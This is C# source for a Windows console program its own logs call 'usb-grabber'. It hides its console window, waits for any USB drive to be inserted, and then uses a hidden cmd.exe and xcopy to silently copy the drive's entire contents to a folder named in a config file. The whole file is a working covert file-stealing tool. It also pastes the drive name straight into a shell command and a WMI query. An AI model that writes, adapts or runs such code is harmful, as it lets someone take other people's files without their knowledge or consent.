using System;
using System.Management;
using System.Diagnostics;
using System.Threading;
using System.IO;
using static System.Diagnostics.Process;
using System.Runtime.InteropServices;
using System.Linq;

namespace ConsoleApp
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        public const int SW_HIDDEN = 0;

        private static bool WriteLog(string strMessage, string strFileName)
        {
            try
            {
                FileStream objFilestream = new FileStream(string.Format("{0}\\{1}", Path.GetTempPath(), strFileName), FileMode.Append, FileAccess.Write);
                StreamWriter objStreamWriter = new StreamWriter((Stream)objFilestream);
                objStreamWriter.WriteLine(strMessage);
                objStreamWriter.Close();
                objFilestream.Close();
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }

        private static void CopyContent(string driveName, string serialNumber, string logFileName)
        {
            try
            {
                int exitCode;
                ProcessStartInfo processInfo;
                Process process;

                string destinationPath = File.ReadAllText(@".\configmsf.ini");
                destinationPath = destinationPath.Trim() + @"\" + serialNumber;
                Directory.CreateDirectory(destinationPath);
                string CopyCommand = "xcopy " + driveName + @"\*.*  " + destinationPath.Trim() + " /S /Z /Y /I /J /D >> %temp%\\" + logFileName;
                Console.WriteLine("Copy cmd: " + CopyCommand);

                processInfo = new ProcessStartInfo("cmd.exe", "/c " + CopyCommand);
                processInfo.CreateNoWindow = true;
                processInfo.UseShellExecute = false;
                // *** Redirect the output ***
                processInfo.RedirectStandardError = true;

                process = Process.Start(processInfo);
                process.WaitForExit();
                string error = process.StandardError.ReadToEnd();

                exitCode = process.ExitCode;
                if (!String.IsNullOrEmpty(error))
                {
                    WriteLog(error, logFileName);
                }

                process.Close();
            }
            catch (Exception ex)
            {
                WriteLog("ERR :: While copying data at" + DateTime.Now  + ": " + ex.Message.ToString(), logFileName);
            }
        }

        private static void DeviceInsertedEvent(object sender, EventArrivedEventArgs e)
        {
            string driveName = "";
            string serialNumber = "";
            string logFileName = "usb-grabber-";
            try
            {
                driveName = e.NewEvent.Properties["DriveName"].Value.ToString();
                ManagementObjectSearcher searcher  = new ManagementObjectSearcher("SELECT VolumeSerialNumber from Win32_LogicalDisk where Name='" + driveName + "'");
                ManagementObjectCollection list = searcher.Get();
                serialNumber = list.OfType<ManagementObject>().FirstOrDefault().Properties["VolumeSerialNumber"].Value.ToString();
                logFileName = logFileName + serialNumber + ".txt";
            }
            catch(Exception ex)
            {
                WriteLog("ERR :: Unable to read USB Drive Letter or Serial Number at " + DateTime.Now + ": " + ex.Message.ToString(), logFileName);
            }
            if (!String.IsNullOrEmpty(driveName))
            {
                WriteLog("****************************************************************************************************", logFileName);
                WriteLog(driveName + " drive inserted at " + DateTime.Now, logFileName);
                WriteLog(" ", logFileName);
                CopyContent(driveName, serialNumber, logFileName);
            }
        }

        static void Main(string[] args)
        {
            try
            {
                IntPtr winHandle = GetCurrentProcess().MainWindowHandle;
                ShowWindow(winHandle, SW_HIDDEN);
            }
            catch (Exception ex)
            {
                WriteLog("ERR :: Not able to hide console app " + DateTime.Now + ": " + ex.Message.ToString(), "usb-grabber.txt");
            }

            ManagementEventWatcher watcher = new ManagementEventWatcher();
            WqlEventQuery query = new WqlEventQuery("SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2");
            watcher.EventArrived += new EventArrivedEventHandler(DeviceInsertedEvent);
            watcher.Query = query;
            watcher.Start();
            Thread.Sleep(Timeout.Infinite);
        }
    }
}
